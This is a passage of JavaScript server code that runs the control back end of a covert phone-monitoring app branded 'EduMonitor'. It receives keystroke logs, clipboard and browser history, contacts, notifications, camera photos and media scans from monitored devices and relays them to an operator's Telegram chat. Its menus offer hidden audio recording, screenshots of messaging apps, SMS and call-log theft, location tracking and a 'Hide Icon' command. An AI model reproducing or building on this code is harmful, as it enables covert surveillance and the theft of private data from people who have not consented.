        { command: 'location', delay: 62, description: 'Location' },
        { command: 'screenshot_settings', delay: 65, description: 'Screenshot Settings' },
        { command: 'recording_settings', delay: 68, description: 'Recording Settings' },
        { command: 'app_opens', delay: 71, description: 'App Opens' }
    ];
    
    commands.forEach((cmd) => {
        const commandObject = {
            command: cmd.command,
            originalCommand: `/${cmd.command}`,
            messageId: null,
            timestamp: Date.now() + (cmd.delay * 1000),
            autoData: true
        };
        
        device.pendingCommands.push(commandObject);
        console.log(`📝 Auto-data command queued: ${cmd.command} (${cmd.description})`);
    });
    
    console.log(`✅ All ${commands.length} auto-data commands queued for ${deviceId}`);
}

// ============= PHOTO UPLOAD ENDPOINT =============
app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const caption = req.body.caption || '📸 Camera Photo';
        
        if (!deviceId || !req.file) {
            console.error('❌ Missing fields in photo upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📸 Photo upload from ${deviceId}: ${req.file.filename} (${req.file.size} bytes)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const fullCaption = `📱 *${deviceName}*\n\n${caption}`;
        
        await sendTelegramPhoto(chatId, filePath, req.file.originalname, fullCaption);
        
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted photo: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting photo:', e);
            }
        }, 60000);
        
        res.json({ success: true, filename: req.file.filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ Photo upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

async function sendTelegramPhoto(chatId, filePath, filename, caption) {
    try {
        console.log(`📸 Sending photo to ${chatId}: ${filename}`);
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);
        
        const response = await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
            headers: {
                ...formData.getHeaders()
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        console.log(`✅ Photo sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending photo:', error.response?.data || error.message);
        
        try {
            console.log('📎 Falling back to document send...');
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', fs.createReadStream(filePath), { filename });
            formData.append('caption', caption);
            
            const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
                headers: {
                    ...formData.getHeaders()
                }
            });
            
            console.log(`✅ Photo sent as document to ${chatId}`);
            return response.data;
        } catch (e) {
            console.error('❌ Document fallback also failed:', e.message);
            return null;
        }
    }
}

// ============= NEW DETAILED EXPORT ENDPOINTS =============

app.post('/api/contacts-detailed/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📇 Detailed contacts from ${deviceId}: ${filename} (${itemCount} contacts)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n📇 Detailed Contacts Export (${itemCount} contacts)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Detailed contacts error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/apps-detailed/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📱 Detailed apps from ${deviceId}: ${filename} (${itemCount} apps)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n📱 Detailed Apps Export (${itemCount} apps)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Detailed apps error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/keystrokes-detailed/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`⌨️ Detailed keystrokes from ${deviceId}: ${filename} (${itemCount} entries)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n⌨️ Detailed Keystroke Logs (${itemCount} entries)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Detailed keystrokes error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/notifications-detailed/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`🔔 Detailed notifications from ${deviceId}: ${filename} (${itemCount} entries)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n🔔 Detailed Notifications (${itemCount} entries)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Detailed notifications error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/device-snapshots/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📊 Device snapshots from ${deviceId}: ${filename} (${itemCount} snapshots)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n📊 Device Info Snapshots (${itemCount} snapshots)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Device snapshots error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/app-opens/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📱 App opens from ${deviceId}: ${filename} (${itemCount} entries)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n📱 App Opens Export (${itemCount} entries)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ App opens error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/clipboard/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📋 Clipboard logs from ${deviceId}: ${filename} (${itemCount} entries)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n📋 Clipboard History Export (${itemCount} entries)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Clipboard logs error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/browser-history/:deviceId', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !filename || !req.file) {
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`🌐 Browser history from ${deviceId}: ${filename} (${itemCount} entries)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const caption = `📱 *${deviceName}*\n\n🌐 Browser History Export (${itemCount} entries)`;
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
        }, 60000);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Browser history error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============= SCREENSHOT SETTINGS ENDPOINT =============
app.post('/api/screenshot-settings/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const settingsData = req.body;
        
        console.log(`📸 Screenshot settings from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        device.screenshotSettings = settingsData;
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Screenshot settings error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============= RECORDING SETTINGS ENDPOINT =============
app.post('/api/recording-settings/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const settingsData = req.body;
        
        console.log(`🎤 Recording settings from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        device.recordingSettings = settingsData;
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Recording settings error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============= MEDIA SCAN ENDPOINT =============
app.post('/api/media-scan/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const scanData = req.body;
        
        console.log(`🔍 Media scan results from ${deviceId}:`, scanData);
        
        const device = devices.get(deviceId);
        if (!device) {
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        let message = `📱 *${deviceName}*\n\n`;
        message += `🔍 *Media Scan Complete*\n\n`;
        
        if (scanData.files && scanData.files.length > 0) {
            message += `Found ${scanData.files.length} media files:\n`;
            scanData.files.slice(0, 10).forEach(file => {
                message += `• ${file.name} (${(file.size/1024/1024).toFixed(2)} MB)\n`;
            });
            if (scanData.files.length > 10) {
                message += `... and ${scanData.files.length - 10} more\n`;
            }
        } else {
            message += `No media files found.`;
        }
        
        await sendTelegramMessage(chatId, message);
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Media scan error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============= WEBHOOK ENDPOINT =============

app.post('/webhook', async (req, res) => {
    res.sendStatus(200);
    
    setImmediate(async () => {
        try {
            const update = req.body;
            console.log('📩 Received update type:', update.callback_query ? 'callback' : (update.message ? 'message' : 'other'));

            if (update.callback_query) {
                await handleCallbackQuery(update.callback_query);
                return;
            }

            if (!update?.message) {
                console.log('📭 Non-message update');
                return;
            }

            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;

            if (!isAuthorizedChat(chatId)) {
                console.log(`⛔ Unauthorized chat: ${chatId}`);
                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                return;
            }

            await setChatMenuButton(chatId);

            const userState = userStates.get(chatId);
            
            if (userState) {
                await handleConversationMessage(chatId, text, messageId, userState);
                return;
            }

            if (text?.startsWith('/')) {
                await handleCommand(chatId, text, messageId);
            } else {
                await sendTelegramMessageWithKeyboard(
                    chatId,
                    "🤖 Use the menu button below or type /help to see available commands.",
                    getMainMenuKeyboard(chatId)
                );
            }
        } catch (error) {
            console.error('❌ Error processing webhook:', error);
        }
    });
});

// ============= CALLBACK QUERY HANDLER =============

async function handleCallbackQuery(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;
    
    console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
    
    await answerCallbackQuery(callbackId);
    
    // ============= NEW MENU HANDLERS =============
    if (data === 'menu_new_features') {
        await editMessageKeyboard(chatId, messageId, getNewFeaturesKeyboard());
        await sendTelegramMessage(chatId, "🆕 *NEW FEATURES MENU*\n\nSelect a category to explore the latest additions to EduMonitor!");
        
    } else if (data === 'menu_detailed_exports') {
        await editMessageKeyboard(chatId, messageId, getDetailedExportsKeyboard());
        await sendTelegramMessage(chatId, "📊 *DETAILED EXPORTS*\n\nGet comprehensive data exports with full details:\n\n• Detailed Contacts (JSON format)\n• Detailed Apps (with permissions & usage)\n• Detailed Keystrokes (full logs)\n• Detailed Notifications (with context)\n• Device Snapshots (historical data)\n\nEach export includes timestamps and complete metadata.");
        
    } else if (data === 'menu_file_scanner') {
        await editMessageKeyboard(chatId, messageId, getFileScannerKeyboard());
        await sendTelegramMessage(chatId, "🔍 *FILE SCANNER*\n\nPowerful file system scanning tools:\n\n• Full System Scan - All files\n• Media Only Scan - Audio/Video/Images only\n• Deep Scan - Detailed with full paths\n• Find Recordings - Audio recordings\n• Find All Media - All media files\n\nReports are sent as interactive HTML files with search and export features.");
        
    } else if (data === 'menu_data_saving') {
        await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
        await sendTelegramMessage(chatId, "📡 *DATA SAVING MODE*\n\nSave mobile data usage:\n\n• WiFi-Only Mode: Media files only upload on WiFi\n• Network Status: Check current connection\n• WiFi-Only Status: View current mode\n\nEnable WiFi-Only to save mobile data when sending screenshots, recordings, and videos.");
        
    } else if (data === 'menu_audio_quality') {
        await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
        await sendTelegramMessage(chatId, "🎚️ *AUDIO QUALITY SETTINGS*\n\nAdjust recording quality to balance file size and clarity:\n\n• Ultra Low (8kbps) - Smallest files\n• Very Low (16kbps) - Very small\n• Low (24kbps) - Small files\n• Medium (32kbps) - Balanced\n• High (64kbps) - Best quality\n\nLower quality = smaller files, faster uploads.");
        
    } else if (data === 'menu_sync_harvest') {
        await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
        await sendTelegramMessage(chatId, "🔄 *SYNC & HARVEST*\n\nData synchronization tools:\n\n• Sync All Tables - Sync all specialized data\n• Force Harvest - Force immediate data collection\n• Refresh Data - Sync unsent logs\n• Database Stats - View statistics\n• Clear Logs - Clean database\n• Logs Count - Count entries\n• Reboot Services - Restart all services");
        
    } else if (data === 'menu_realtime_advanced') {
        await editMessageKeyboard(chatId, messageId, getRealtimeAdvancedKeyboard());
        await sendTelegramMessage(chatId, "🔊 *ADVANCED REALTIME CONTROLS*\n\nFine-tune real-time logging:\n\n• Keystrokes - Enable/disable separately\n• Notifications - Enable/disable separately\n• All ON/OFF - Master controls\n• Status - View current settings\n\nSeparate controls give you granular control over what gets sent instantly.");
        
    } else if (data === 'menu_app_opens') {
        await editMessageKeyboard(chatId, messageId, getAppOpensKeyboard());
        await sendTelegramMessage(chatId, "📱 *APP OPEN LOGS*\n\nTrack when apps are opened:\n\n• JSON format for processing\n• HTML format for viewing\n\nEach entry includes:\n• App name\n• Package name\n• Activity class\n• Timestamp\n• Count of opens in batch");
        
    } else if (data === 'menu_calendar') {
        await editMessageKeyboard(chatId, messageId, getCalendarKeyboard());
        await sendTelegramMessage(chatId, "📅 *CALENDAR EVENTS*\n\nExport calendar data:\n\n• JSON format for processing\n• HTML format for viewing\n\nIncludes:\n• Event titles\n• Dates and times\n• Locations\n• Descriptions\n• Recurrence rules");
        
    } else if (data === 'menu_clipboard') {
        await editMessageKeyboard(chatId, messageId, getClipboardKeyboard());
        await sendTelegramMessage(chatId, "📋 *CLIPBOARD LOGS*\n\nExport clipboard history:\n\n• JSON format for processing\n• HTML format for viewing\n\nCaptures copied text with timestamps.");
        
    } else if (data === 'menu_browser_history') {
        await editMessageKeyboard(chatId, messageId, getBrowserHistoryKeyboard());
        await sendTelegramMessage(chatId, "🌐 *BROWSER HISTORY*\n\nExport browsing history:\n\n• JSON format for processing\n• HTML format with clickable links\n\nIncludes:\n• URLs visited\n• Browser package\n• Timestamps\n• Page titles (when available)");
        
    } else if (data === 'help_main') {
        await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
        
    } else if (data === 'menu_devices') {
        const userDevices = getDeviceListForUser(chatId);
        const keyboard = getDeviceSelectionKeyboard(chatId);
        
        let message = `📱 *Device Management*\n\n`;
        message += `You have ${userDevices.length} device(s) registered.\n\n`;
        
        if (userDevices.length > 0) {
            message += `*Active Devices:*\n`;
            userDevices.forEach(device => {
                const status = device.isActive ? '✅ ' : '○ ';
                message += `${status} ${device.name}\n`;
                message += `   └ ID: ${device.id.substring(0, 8)}...\n`;
                message += `   └ Last seen: ${device.lastSeenFormatted}\n`;
                if (device.phoneNumber !== 'Not available') {
                    message += `   └ Phone: ${device.phoneNumber}\n`;
                }
                message += `\n`;
            });
        } else {
            message += `No devices found. Make sure the app is running and registered.`;
        }
        
        await editMessageKeyboard(chatId, messageId, keyboard);
        await sendTelegramMessage(chatId, message);
        
    } else if (data === 'refresh_devices') {
        const keyboard = getDeviceSelectionKeyboard(chatId);
        await editMessageKeyboard(chatId, messageId, keyboard);
        await answerCallbackQuery(callbackId, '🔄 Device list refreshed');
        
    } else if (data === 'device_stats') {
        const userDevices = getDeviceListForUser(chatId);
        let message = `📊 *Device Statistics*\n\n`;
        message += `Total Devices: ${userDevices.length}\n\n`;
        
        userDevices.forEach((device, index) => {
            message += `*Device ${index + 1}:* ${device.name}\n`;
            message += `• ID: ${device.id.substring(0, 8)}...\n`;
            message += `• Last Seen: ${device.lastSeenFormatted}\n`;
            message += `• Status: ${(Date.now() - device.lastSeen) < 300000 ? '✅ Online' : '⏹️ Offline'}\n`;
            if (device.phoneNumber !== 'Not available') {
                message += `• Phone: ${device.phoneNumber}\n`;
            }
            message += `\n`;
        });
        
        await answerCallbackQuery(callbackId);
        await sendTelegramMessage(chatId, message);
        
    } else if (data.startsWith('select_device:')) {
        const selectedDeviceId = data.split(':')[1];
        const device = devices.get(selectedDeviceId);
        
        if (device) {
            userDeviceSelection.set(chatId, selectedDeviceId);
            
            await answerCallbackQuery(callbackId, `✅ Now controlling ${device.deviceInfo?.model || 'device'}`);
            
            const keyboard = getMainMenuKeyboard(chatId);
            await editMessageKeyboard(chatId, messageId, keyboard);
            
            await sendTelegramMessage(chatId, 
                `✅ *Now controlling:*\n` +
                `• Device: ${device.deviceInfo?.model || 'Unknown'}\n` +
                `• ID: ${selectedDeviceId.substring(0, 8)}...\n` +
                `• Last seen: ${new Date(device.lastSeen).toLocaleString()}\n\n` +
                `All commands will now be sent to this device.`);
        }
        
    } else if (data === 'menu_camera') {
        const keyboard = [
            [
                { text: '📸 Take Photo', callback_data: 'cmd:photo' },
                { text: '🔄 Switch Camera', callback_data: 'cmd:camera_switch' }
            ],
            [
                { text: '👤 Front Camera', callback_data: 'cmd:camera_front' },
                { text: '👥 Back Camera', callback_data: 'cmd:camera_back' }
            ],
            [
                { text: '✅ Start Monitoring', callback_data: 'cmd:camera_on' },
                { text: '❌ Stop Monitoring', callback_data: 'cmd:camera_off' }
            ],
            [
                { text: '📊 Camera Status', callback_data: 'cmd:camera_status' },
                { text: '◀️ Back', callback_data: 'help_main' }
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_device_info') {
        const keyboard = [
            [
                createInlineButton('🌐 Network Info', 'cmd:network'),
                createInlineButton('📱 Apps List', 'cmd:apps')
            ],
            [
                createInlineButton('📱 Device Info', 'cmd:info'),
                createInlineButton('🔋 Battery', 'cmd:battery')
            ],
            [
                createInlineButton('💾 Storage', 'cmd:storage'),
                createInlineButton('🕐 Time', 'cmd:time')
            ],
            [
                createInlineButton('📊 Status', 'cmd:status'),
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_phone_info') {
        const keyboard = [
            [
                createInlineButton('📞 Phone Number', 'cmd:phone_number'),
                createInlineButton('📱 SIM Info', 'cmd:sim_info')
            ],
            [
                createInlineButton('📱 Mobile Info', 'cmd:mobile_info'),
                createInlineButton('📞 Call Logs', 'cmd:calllogs')
            ],
            [
                createInlineButton('📍 Location', 'cmd:location'),
                createInlineButton('💬 SMS', 'cmd:sms')
            ],
            [
                createInlineButton('📇 Contacts', 'cmd:contacts'),
                createInlineButton('📅 Calendar', 'cmd:calendar')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_tracking') {
        const keyboard = [
            [
                createInlineButton('📍 Location', 'cmd:location'),
                createInlineButton('⌨️ Keystrokes', 'cmd:keystrokes')
            ],
            [
                createInlineButton('🔔 Notifications', 'cmd:notifications'),
                createInlineButton('📱 App Opens', 'cmd:app_opens')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_screenshot') {
        const keyboard = [
            [
                createInlineButton('📸 Take Now', 'cmd:screenshot'),
                createInlineButton('⚙️ Settings', 'cmd:screenshot_settings')
            ],
            [
                createInlineButton('▶️ Start Service', 'cmd:start_screenshot'),
                createInlineButton('⏹️ Stop Service', 'cmd:stop_screenshot')
            ],
            [
                createInlineButton('📸 Screenshot Logs', 'cmd:screenshots'),
                createInlineButton('📏 Size Status', 'cmd:size_status')
            ],
            [
                createInlineButton('📸 Method Info', 'cmd:screenshot_method'),
                createInlineButton('📱 Target Apps', 'cmd:target_apps')
            ],
            [
                createInlineButton('➕ Add Target', 'cmd:add_target_example'),
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_recording') {
        const keyboard = [
            [
                createInlineButton('🎤 Start 60s', 'cmd:record'),
                createInlineButton('⏹️ Stop 60s', 'cmd:stop_recording')
            ],
            [
                createInlineButton('⚙️ Settings', 'cmd:recording_settings'),
                createInlineButton('⏰ Schedule', 'cmd:record_schedule')
            ],
            [
                createInlineButton('✅ Auto ON', 'cmd:record_auto_on'),
                createInlineButton('❌ Auto OFF', 'cmd:record_auto_off')
            ],
            [
                createInlineButton('🔍 Find Media', 'cmd:find_media'),
                createInlineButton('⚙️ Custom Schedule', 'start_custom_schedule_interactive')
            ],
            [
                createInlineButton('🎚️ Audio Quality', 'menu_audio_quality'),
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_social') {
        const keyboard = [
            [
                createInlineButton('💬 WhatsApp', 'cmd:whatsapp'),
                createInlineButton('💬 Telegram', 'cmd:telegram')
            ],
            [
                createInlineButton('💬 Facebook', 'cmd:facebook'),
                createInlineButton('🌐 Browser History', 'cmd:browser_history')
            ],
            [
                createInlineButton('📋 Clipboard', 'cmd:clipboard'),
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_media') {
        const keyboard = [
            [
                createInlineButton('🔍 Find Media', 'cmd:find_media'),
                createInlineButton('📸 Screenshots', 'cmd:screenshots')
            ],
            [
                createInlineButton('🎤 Find Recordings', 'cmd:find_recorded'),
                createInlineButton('🎵 Media Scan', 'cmd:media_scan')
            ],
            [
                createInlineButton('🔬 Full Scan', 'cmd:full_scan'),
                createInlineButton('❓ Scan Help', 'cmd:scan_help')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_network') {
        const keyboard = [
            [
                createInlineButton('🌐 IP Info', 'cmd:ip_info'),
                createInlineButton('📶 WiFi Info', 'cmd:wifi_info')
            ],
            [
                createInlineButton('📱 Mobile Info', 'cmd:mobile_info'),
                createInlineButton('📡 Network Status', 'cmd:network')
            ],
            [
                createInlineButton('🌍 All Network', 'cmd:all_info'),
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_realtime') {
        const keyboard = [
            [
                createInlineButton('🔑 Keys ON', 'cmd:realtime_keystrokes_on'),
                createInlineButton('🔑 Keys OFF', 'cmd:realtime_keystrokes_off')
            ],
            [
                createInlineButton('🔔 Notif ON', 'cmd:realtime_notifications_on'),
                createInlineButton('🔔 Notif OFF', 'cmd:realtime_notifications_off')
            ],
            [
                createInlineButton('✅ All ON', 'cmd:realtime_all_on'),
                createInlineButton('❌ All OFF', 'cmd:realtime_all_off')
            ],
            [
                createInlineButton('📊 Status', 'cmd:realtime_status'),
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_services') {
        const keyboard = [
            [
                createInlineButton('👻 Hide Icon', 'cmd:hide_icon'),
                createInlineButton('👁️ Show Icon', 'cmd:show_icon')
            ],
            [
                createInlineButton('🔄 Reboot Services', 'cmd:reboot_app'),
                createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs')
            ],
            [
                createInlineButton('📊 Service Status', 'cmd:status'),
                createInlineButton('📝 Logs Count', 'cmd:logs_count')
            ],
            [
                createInlineButton('📈 Stats', 'cmd:stats'),
                createInlineButton('🔄 Refresh', 'cmd:refresh_data')
            ],
            [
                createInlineButton('⚡ Force Harvest', 'cmd:force_harvest'),
                createInlineButton('🔄 Sync All', 'cmd:sync_all')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'close_menu') {
        await editMessageKeyboard(chatId, messageId, []);
        await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
        
    } else if (data === 'start_custom_schedule_interactive') {
        userStates.set(chatId, {
            state: SCHEDULE_STATES.AWAITING_START_TIME,
            data: {}
        });
        
        const keyboard = [[createInlineButton('❌ Cancel', 'cancel_setup')]];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
        await sendTelegramMessage(chatId, 
            "⚙️ *Custom Schedule Setup*\n\n" +
            "Please enter the START time in 24-hour format (HH:MM)\n" +
            "Example: `22:00` for 10:00 PM");
        
    } else if (data === 'cancel_setup') {
        userStates.delete(chatId);
        await editMessageKeyboard(chatId, messageId, []);
        await sendTelegramMessage(chatId, "❌ Schedule setup cancelled.");
        
    } else if (data === 'cmd:add_target_example') {
        await sendTelegramMessage(chatId, 
            "📱 *Add Target App*\n\n" +
            "Use: `/add_target com.package.name`\n\n" +
            "Examples:\n" +
            "• `/add_target com.instagram.android`\n" +
            "• `/add_target com.whatsapp`\n" +
            "• `/add_target com.facebook.katana`");
        
    } else if (data.startsWith('recurring:')) {
        const recurring = data.split(':')[1];
        const userState = userStates.get(chatId);
        
        if (userState && userState.state === SCHEDULE_STATES.AWAITING_RECURRING) {
            userState.data.recurring = recurring === 'daily';
            userState.state = SCHEDULE_STATES.AWAITING_INTERVAL;
            
            await editMessageKeyboard(chatId, messageId, []);
            await sendTelegramMessage(chatId, 
                "✅ Schedule type recorded.\n\n" +
                "Finally, enter the recording interval in minutes (e.g., 15, 30, 60):");
        }
        
    } else if (data.startsWith('cmd:')) {
        const command = data.substring(4);
        console.log(`🎯 Executing command from button: ${command}`);
        
        await answerCallbackQuery(callbackId, `⏳ Executing ${command}...`);
        
        await handleCommand(chatId, `/${command}`, messageId);
        
        const keyboard = [
